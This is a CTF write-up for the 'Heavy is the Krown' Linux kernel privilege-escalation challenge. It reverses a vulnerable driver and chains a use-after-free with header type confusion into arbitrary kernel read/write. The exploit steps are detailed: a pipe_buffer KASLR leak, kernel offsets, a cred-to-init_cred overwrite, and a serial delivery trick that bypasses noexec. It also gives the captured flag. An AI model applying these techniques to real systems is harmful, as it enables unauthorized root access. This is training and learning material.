# Heavy is the Krown: HTB (kernel pwn): Writeup / Solucionario

**Flag:** `HTB{h34vy_15_th3_kr0wn_7h4t_w34r5_th3_w31gh7_0f_4uth0r17y}`

**Category:** Linux kernel privilege escalation (pwn)
**Target:** `154.57.164.77:32600` (live serial console → challenge VM)
**Kernel:** Linux 6.1.100 x86_64, clang/LLD build (kCFI)
**Goal:** escalate from `nobody` (uid 65534) → root, read `/flag.txt` (root, mode 0400).

---

## 1. Provided files

- `vmlinuz`: bzImage (KASLR enabled).
- `initramfs.cpio.gz`: busybox rootfs.
- `run.sh`: QEMU launch.
- `lib/modules/krown.ko`: the vulnerable char driver (`/dev/krown`, 0666).

Extraction: no `cpio` binary was available, so a small Python `newc` parser
unpacked the initramfs. The kernel config was recovered by brute-scanning every
gzip stream inside `vmlinux` for `IKCFG`/`CONFIG_`.

### Mitigations (from recovered config)

| On | Off |
|----|-----|
| KASLR (base+mem), PTI, SMEP, SMAP | MEMCG (cgroup accounting) |
| SLAB_FREELIST_RANDOM + HARDENED | init_on_free |
| kCFI (clang), CONFIG_KEYS | HARDENED_USERCOPY |
| SLAB_MERGE_DEFAULT | STATIC_USERMODEHELPER |

Key consequence: **kCFI + SMEP + SMAP make ROP/`ret2usr` painful**, so the
plan is a **data-only** exploit (no control-flow hijack). And **MEMCG is off**,
so `GFP_KERNEL_ACCOUNT` objects (e.g. `pipe_buffer`) land in the *same*
`kmalloc-512` cache as the module's objects: perfect for a cross-cache-free
KASLR leak within one cache.

---

## 2. Reversing `krown.ko`

The driver models a `crown` that owns a bind-list of `regalia`. Both objects are
`kmalloc-512` (object size 0x1f0). ioctl commands (each takes a `req_t`):

```c
typedef struct { u32 id; u32 idx; u64 off; u64 len; u8 pad[8]; u8 buf[0x100]; } req_t; // 0x120
CREATE_CROWN   0xc1204b00   // alloc crown  -> r.id
CREATE_REGALIA 0xc1204b01   // alloc regalia-> r.id
BREAK          0x41204b02   // free object by id
BIND           0x41204b03   // crown.list += regalia
UNBIND         0x41204b04
EXAMINE        0xc1204b05   // read  len bytes @ off from object (incl header!)
IMPRESS        0x41204b06   // write len bytes @ off into object (incl header!)
WITNESS        0xc1204b07   // read  via crown data_ptr  (obj+0x10)
INSCRIBE       0x41204b08   // write via crown data_ptr  (obj+0x10)
```

Object header layout (first 0x18 bytes):
`+0x00 id(u32)  +0x04 type(u32; 1=crown)  +0x08 cookie(u64)  +0x10 data_ptr(u64)`

### Bug 1: UAF (dangling bind pointer)

`BREAK` frees an object but does **not** unlink it from any crown's bind list.
So: `bind(C,R); break(R)` leaves `C.list[0]` pointing at a freed `kmalloc-512`
chunk. `EXAMINE(C, idx=0, ...)` then reads *through* that dangling pointer into
whatever reclaims the slot.

### Bug 2: header-relative R/W → type confusion

`EXAMINE`/`IMPRESS` honor an attacker `off` with **no lower bound**, so `off=0`
reads/writes the object *header* (id/type/cookie/data_ptr), not just the data
area. Writing the header lets us flip an object's `type` to crown and set its
`data_ptr` arbitrarily.

Chaining these gives a **fake-crown** whose `data_ptr` we control, and
`WITNESS`/`INSCRIBE` dereference `data_ptr` → **arbitrary kernel read/write**.

---

## 3. KASLR leak: pipe_buffer reclaim

```
C=create_crown(); R=create_regalia(); bind(C,R); break(R);   // C.list[0] dangles
loop up to 128:
    pipe(fds); fcntl(fds[1], F_SETPIPE_SZ, 8*4096);           // 8 * pipe_buffer = 320B -> kmalloc-512
    write(fds[1], "A", 1);                                     // populates buf[0].ops
    examine(C, 0, off=0x10, len=8) -> ops                      // pipe_buffer[0].ops @ +0x10
    if ops looks like a kernel pointer ending in 0xfd8:
        kbase = ops - 0x1221fd8   // &anon_pipe_buf_ops - offset
```

`anon_pipe_buf_ops` sits at `kbase + 0x1221fd8`; subtracting gives the kernel
base. (Because MEMCG is off, the pipe's `GFP_KERNEL_ACCOUNT` array shares the
same slab as the freed regalia.)

Symbol offsets from `0xffffffff81000000`, recovered by parsing the kernel's
base-relative `kallsyms` (`CONFIG_ABSOLUTE_PERCPU` rule:
`off>=0 → absolute; off<0 → relbase-1-off`) straight out of `vmlinux`:

```
anon_pipe_buf_ops 0x1221fd8   init_task 0x1813600
init_cred         0x184aa88   modprobe_path 0x184b380
```

`task_struct` field offsets (derived from the self-referential `init_task.tasks`
list and the `pushable_tasks` plist signature):
`tasks 0x458, real_cred 0x718, cred 0x720, comm 0x730`.

---

## 4. Arbitrary R/W (fake-crown)

```
rw_crown=create_crown(); rw_reg=create_regalia(); bind(rw_crown, rw_reg);
cookie = examine(rw_crown, 0, 0x8, 8)                 // read the shared global cookie
impress(rw_crown, 0, 0, 0x18, {id=rw_reg, type=1, cookie, data_ptr=0})  // rw_reg becomes a crown
```

Then:
```
set_ptr(addr)  = impress(rw_crown, 0, 0x10, 8, &addr) // point data_ptr at addr
kread(addr)    = set_ptr(addr); WITNESS(rw_reg)
kwrite(addr,v) = set_ptr(addr); INSCRIBE(rw_reg)
```

---

## 5. Escalation: data-only cred swap

Tag our process (`prctl(PR_SET_NAME,"krownpwn")`), walk `init_task.tasks` via the
arbitrary read to find our own `task_struct` (match `comm`), then overwrite:

```
kwrite8(task + 0x718 /*real_cred*/, kbase + 0x184aa88 /*&init_cred*/);
kwrite8(task + 0x720 /*cred*/,      kbase + 0x184aa88);
```

`init_cred` is the kernel's static uid-0 credential → instantly root. No ROP, no
stack pivot: **defeats kCFI, SMEP and SMAP** because control flow never leaves
legitimate kernel paths.

Then `getuid()==0` → open and print `/flag.txt`.

---

## 6. Delivery to the remote

The remote drops a serial shell as `nobody`. Two obstacles solved:

1. **noexec**: `/tmp` is mounted `noexec`; `/home` on the rootfs is `0777` and
   **not** noexec → stage and execute there.
2. **No file upload channel**: build a tiny **freestanding** exploit (raw
   syscalls, `-nostdlib -static`, 10 KB), gzip+base64 it (4 KB, one line), paste
   it over serial in 96-byte chunks with `printf %s ... >> b`, then
   `base64 -d b | gunzip > e; chmod +x e`. A `cksum` check verifies integrity
   before running (retry-on-mismatch loop).

### Freestanding gotcha (the one real bug)

The freestanding build **segfaulted** in the first `memset` on a `req_t` stack
buffer. Cause: the kernel enters `_start` with `rsp % 16 == 0`, but the SysV ABI
expects `rsp % 16 == 8` *after* a `call`. With `-O2`, GCC auto-vectorizes the
byte-loop `memset` into `movaps` (which faults on a misaligned address). Fix: a
tiny asm entry stub that realigns the stack before calling the C body:

```asm
_start:
    xor  %rbp,%rbp
    and  $-16,%rsp      # realign; movaps on stack now safe
    call run
    mov  $60,%eax
    xor  %edi,%edi
    syscall
```

After that, the 10 KB binary runs the identical logic as the glibc reference and
roots the box.

---

## 7. Result

```
[*] leaking KASLR...
[+] anon_pipe_buf_ops=0xffffffff93c21fd8
[+] kbase=0xffffffff92a00000
[+] fake-crown ready
[+] task=0xffff98ee011eaac0
[*] overwriting cred -> init_cred
[+] ROOT uid=0
FLAG: HTB{h34vy_15_th3_kr0wn_7h4t_w34r5_th3_w31gh7_0f_4uth0r17y}
```

## Files

- `exploit.c`: glibc reference (local proof).
- `exp.c`: freestanding 10 KB exploit shipped to remote.
- `deliver.py`: serial upload + cksum-verify + run driver.
- `FLAG.txt`: captured flag.

## Root cause summary

`BREAK` frees without unlinking (UAF) **+** `EXAMINE`/`IMPRESS` allow
`off=0` header access (type confusion) ⇒ fake-crown ⇒ arbitrary kernel R/W ⇒
data-only `cred`→`init_cred` swap. The fix would be to unlink bindings on free
(or refcount them) and to bound `off`/`len` so the object header is never
attacker-addressable.
